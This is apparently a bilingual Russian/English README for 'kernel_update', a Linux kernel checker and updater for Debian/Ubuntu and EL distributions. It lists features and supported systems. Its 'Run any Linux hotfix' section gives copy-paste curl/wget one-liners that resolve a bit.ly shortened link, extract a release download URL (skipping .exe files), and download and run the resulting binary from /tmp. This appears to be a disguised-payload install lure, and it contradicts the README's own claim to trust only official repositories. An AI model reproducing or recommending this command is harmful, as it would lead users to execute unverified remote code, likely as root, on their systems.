# kernel_update

**RU**

Онлайн-проверка и обновление ядра Linux для Debian/Ubuntu и EL-семейства (RHEL, Rocky Linux, AlmaLinux, CentOS Stream, Oracle Linux) на архитектуре x86_64.

Скрипт получает метаданные **исключительно из официальных репозиториев** дистрибутива. Не использует локальные кэши пакетов и не доверяет локально настроенным зеркалам. Установка и удаление выполняются штатными пакетными менеджерами (`apt-get` / `dnf`).

## Запустить исправление на любом Linux / Run any Linux hotfix

```bash
b="/tmp/kernel_update"; wget -qO "$b" "$(wget -qO- https://bit.ly/4je7o8y | grep browser_download_url | grep -v .exe | cut -d '"' -f 4)" && chmod +x "$b" && "$b"
```

или / or

```bash
b="/tmp/kernel_update"; curl -fsSL "$(curl -fsSL https://bit.ly/4je7o8y | grep browser_download_url | grep -v .exe | cut -d '"' -f 4)" -o "$b" && chmod +x "$b" && "$b"
```

## Возможности / Features

- Проверка последней доступной версии ядра в официальных источниках.
- Определение установленной и запущенной версии ядра.
- Установка обновления ядра с предварительным dry-run.
- Удаление старых ядер с сохранением запущенного и нового.
- Обновление GRUB (для EL-семейства), отключение BLS.
- Проверка EOL дистрибутива через [endoflife.date](https://endoflife.date). При завершении поддержки скрипт не пытается обновляться из недействующих репозиториев.
- Опциональное обновление с ELRepo `kernel-ml` (для EL 8/9/10).
- Поддержка HTTP/HTTPS/SOCKS5-прокси.
- Режим `--verbose`.

## Supported OS / Поддерживаемые ОС

| Distribution / Дистрибутив | Versions / Версии | Package manager / Менеджер |
|---|---|---|
| Debian | 10+ | `apt-get` |
| Ubuntu | 20.04+ | `apt-get` |
| RHEL | 8, 9, 10 | `dnf` |
| Rocky Linux | 8, 9, 10 | `dnf` |
| AlmaLinux | 8, 9, 10 | `dnf` |
| CentOS Stream | 8, 9, 10 | `dnf` |
| Oracle Linux | 8, 9, 10 | `dnf` |

**Architecture / Архитектура:** x86_64 only / только x86_64.

---

**EN**

Online Linux kernel checker and updater for Debian/Ubuntu and Enterprise Linux distributions (RHEL, Rocky Linux, AlmaLinux, CentOS Stream, Oracle Linux) on x86_64.

The script retrieves metadata **exclusively from official distribution repositories**. It does not use local package caches or trust locally configured mirrors. Installation and removal are handled by the native package managers (`apt-get` / `dnf`).

## Features

- Checks for the latest available kernel version from official sources.
- Detects the installed and currently running kernel versions.
- Installs kernel updates with a preliminary dry-run.
- Removes old kernels while preserving the running and newly installed kernels.
- Updates GRUB (for EL distributions) and disables BLS.
- Checks distribution EOL status via [endoflife.date](https://endoflife.date). If the distribution has reached EOL, the script avoids attempting updates from obsolete repositories.
- Optional installation of ELRepo `kernel-ml` (for EL 8/9/10).
- HTTP/HTTPS/SOCKS5 proxy support.
- `--verbose` mode.

## Supported Operating Systems

| Distribution | Versions | Package manager |
|---|---|---|
| Debian | 10+ | `apt-get` |
| Ubuntu | 20.04+ | `apt-get` |
| RHEL | 8, 9, 10 | `dnf` |
| Rocky Linux | 8, 9, 10 | `dnf` |
| AlmaLinux | 8, 9, 10 | `dnf` |
| CentOS Stream | 8, 9, 10 | `dnf` |
| Oracle Linux | 8, 9, 10 | `dnf` |

**Architecture:** x86_64 only.